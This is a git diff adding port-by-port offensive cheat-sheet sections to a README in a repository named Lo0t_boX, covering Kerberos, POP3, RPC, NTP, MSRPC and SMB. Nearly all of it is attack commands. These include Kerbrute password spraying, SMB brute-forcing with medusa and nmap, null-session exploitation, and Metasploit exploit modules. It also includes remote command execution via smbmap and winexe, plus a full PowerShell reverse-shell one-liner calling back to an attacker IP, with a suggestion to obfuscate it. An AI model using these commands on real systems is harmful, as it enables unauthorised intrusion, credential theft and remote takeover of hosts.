@@ -1,4 +1,3 @@
-[README.md](https://github.com/Indunil-jayaranga/Lo0t_boX/files/9222608/README.md)
 CONTENT
 =======
 * [RECON](#RECON)
@@ -191,7 +190,165 @@ finger user@$IP   #Get user info
 # msf
 msf> use auxiliary/scanner/finger/finger_users[README.md](https://github.com/Indunil-jayaranga/Lo0t_boX/files/9222613/README.md)
 
+```
+## Port 88 - Kerberos 
+```bash
+#GET USERS :
+
+nmap -p 99 --script=krb5-enum-users --script-arg"krb5-enum-users.realm='DOMAIN'"  $IP
+
+python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -domain DOMAIN -outputfile kb_extracted_passwords.txt
 
 ```
 
+## Port 110 - POP3
+```bash
+telnet $IP
+USER user@ip
+PASS password
+
+```
+
+## Port 995 / 110 -POP
+```bash
+# Banner Grabbing
+nc -nv $ip 110
+openssl s_client -connect $ip:995 -crlf -quiet
+
+# Automated
+nmap --scirpt "pop3-capabilities / pop3-ntlm-info" -sV -port <PORT> $ip
+
+```
+
+## Port 111 - Rpcbind
+```bash
+# Enumeration
+rpcinfo <domain> 
+nmap -sSUC -p111 $ip
+
+rpcinfo -p $ip
+rpcclient -U "" $ip
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+```
+
+## Port 123 - TNP
+```bash
+#Enumearation
+
+nmap -sU -sV --script "ntp*" -p 123 $ip
+
+ntpq -c readlist $ip
+ntpq -c readvar $ip
+ntpq -c monlist $ip
+ntpq -c peers $ip
+ntpq -c listpeers $ip
+ntpq -c associations $ip 
+ntpq -c sysinfo $ip
+```
+
+## Port 135 - MSRPC
+```bash
+# Enumeration
+nmap $ip --script=msrpc-enum
+nmap -n -sV -p 135 --script=msrpc-enum $ip
+
+#msf
+msf > use exploit/windows/dcerpc/ms03_026_dcom
+msf > use auxiliary/scanner/dcerpc/endpoint_mapper
+msf > use auxiliary/scanner/dcerpc/hidden
+msf > use auxiliary/scanner/dcerpc/management
+msf > use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
+
+# Identifying Exposed RPC Services
+
+rpcdump -p port $IP
+rpcdump.py $IP -p 135
+```
+
+## Port 139/445 - SMB
+```bash
+# Enum hostname
+enum4linux -n $ip
+nmblookup -A $ip
+nmap --script=smb-enum* --script-args=unsafe=1 $ip
+
+#Get version
+smbver.sh $ip
+msf > use scanner/smb/smb_version
+smbclient -L \\\\$IP
+
+#Get Shares 
+smbmap -H $ip -R <sharename>
+echo exit | smbclient -L \\\\
+smbclient \\\\$ip\<share>
+smbclient -L //$ip -N
+nmap --script smb-enumshares -p139,445 -Pn $ip
+smbclient -L \\\\$ip\\
+
+# check null sessions
+smbmap -H $ip
+rpcclient -U "" -N $ip
+smbclient //$ip/IPC$ -N
+
+#Exploit null sessions
+enum -s $ip
+enum -U $ip
+enum -P $ip
+/usr/share/doc/python3-impacket/examles/samrdump.py $ip
+
+# connect to username shares
+smbclient //$ip/share -U username
+
+# connect to share anonumously 
+smbclient \\\\$IP\\<share>
+smbclient //$IP/<share>
+smbclient //$IP/<share\ name>
+smbclient //$IP/<""share name"">
+rpcclient -U " " $IP
+rpcclient -U " " -N $IP
+
+#check vulns
+nmap --script smb-vuln* -p139,445 -Pn $ip
+
+#check seceurity concerns
+msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc
+
+msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc
+
+#exploits
+msf > use exploit/multi/samba/usermap_script
+
+#Bruteforce login
+medusa -h $IP -u username -P passwordlist.txt -M smbnt
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=passwordlist.txt $ip  
+nmap -script smb-brute $IP
+
+#nmap smb enum & vuln
+nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 $ip
+
+nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 $ip
+
+#Mount smb volume
+mount -t cifs -o username=user,password=password //$ip/share /mnt/share
+
+# Run cmd over smb from linux
+winexe -U username //$ip "cmd.exe" --system
+
+# smbmap
+    #Enum
+smbmap.py -H $ip -u administrator -p asdf1234
+    #RCE
+smbmap.py -u username -p 'password' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H $ip
+    # Drive Listing
+smbmap.py -H $ip -u username -p 'password' -L
+    # Reverse Shell
+smbmap.py -u username -p 'password' -d DOMAINNAME -H $ip -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
+
+#you can use obfuscated one!
+```
 
